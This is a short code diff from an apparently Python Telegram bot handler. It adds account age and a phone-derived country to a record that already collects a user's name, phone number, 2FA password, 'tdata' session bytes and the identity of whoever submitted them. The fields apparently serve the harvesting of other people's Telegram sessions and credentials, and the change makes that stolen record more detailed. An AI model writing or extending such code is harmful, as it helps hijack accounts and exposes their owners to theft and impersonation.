@@ -615,11 +615,13 @@ async def handle_guide_cb(client, cb):
                     syd = f"2FA : {passs}"
                 else:
                     nsyd = ""
-       
+                age = await get_account_age(tele_client)
                 info = {
                     "name": me.first_name or "?",
                     "phone": me.phone or "?",
+                    "country": get_country_from_phone(me.phone),
                     "twofa": syd,
+                    "age": age,
                     "spam": getattr(me, "restricted", False),
                     "by":  f"{message.from_user.first_name}({message.from_user.id})",
                     "tdata": tdata_bytes,
